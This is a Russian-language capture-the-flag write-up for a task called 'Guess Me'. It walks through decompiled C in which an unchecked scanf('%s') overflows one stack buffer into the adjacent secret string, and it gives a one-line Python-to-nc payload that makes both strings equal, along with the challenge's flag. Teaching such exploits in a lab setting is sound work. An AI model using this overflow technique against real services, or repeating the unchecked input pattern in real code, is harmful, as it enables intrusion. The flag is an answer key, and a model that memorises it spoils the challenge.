# Guess Me: Write-up

Перед нами — бинарный файл и сервер, на котором он запущен.

Сервер предлагает нам угадать число:

```
$ nc guess.ctf.upml.tech 1337
Guess my number [1..10000000] and I will give you a flag
123456
Sorry, but you lose :(
```

У нас всего одна попытка, значит, конструктивно этот таск не решить.

Что же можно сделать? Давайте посмотрим на [бинарь](public/binary).
Скачаем его и откроем в *лицензионной* версии IDA Pro. Нажмем F5,
чтобы получить код на C — вы же не хотите разбираться в ассемблере.

```c
...
  char s1; // [rsp+10h] [rbp-50h]
  char s; // [rsp+20h] [rbp-40h]
...
  v4 = rand();
  sprintf(&s, "%d", (unsigned int)(v4 % 10000000 + 1));
...
  __isoc99_scanf("%s", &s1);
  if ( !strcmp(&s1, &s) )
  {
    stream = fopen("flag.txt", "r");
    fread(&ptr, 1uLL, 0x20uLL, stream);
    puts(&ptr);
    fclose(stream);
  }
  else
  {
    puts("Sorry, but you lose :(");
  }
  return 0;
}
```

Что тут происходит?

1. Есть две переменные `s1` и `s`. При этом `s1` находится с адреса `rsp+10h` по адрес `rsp+20h`, т.е. имеет длину 10 (в шестнадцатеричной системе), что равно 16 в десятеричной.
2. Сразу после строки `s1` в памяти идет строка `s`
3. В `s` записывается строковое представление случайного числа
4. В `s1` считывается ответ пользователя
5. Сравниваются строки `s1` и `s`

Где же баг? Баг в том, что при чтении строки `s1` не проверяется её длина! Если мы запишем 32 символа, то первые 16 окажутся в `s1`, а следующие 16 наложатся на `s`! Это значит, что мы можем перезаписать обе строки — и `s1`, и `s`, так, чтобы они были равны.

Отправляем 32 единицы, но что-то не идет. В чем же дело? А дело в том, что C считает, что строка — это какие-то символы до нулевого (символа с кодом 0), который обозначает конец строки.

Поэтому он при сравнении считает, что строка `s1` имеет длину 32. То есть нам нужно передавать нулевые символы.

Как? Воспользуемся Питоном и линуксовыми пайпами:

```bash
python -c "print('1' + '\x00'*15 + '1' + '\x00' * 15)" | nc guess.ctf.upml.tech 1337
```

Что тут происходит? Мы сначала вводим 1 и 15 нулевых символов в строку `s1` (т.е. `s1` равно `"1"`), а потом то же самое — на место строки `s`.

Вот и всё, таким однострочным скриптом получаем флаг.

Флаг: **uctf_345y_fix3d_pwn**

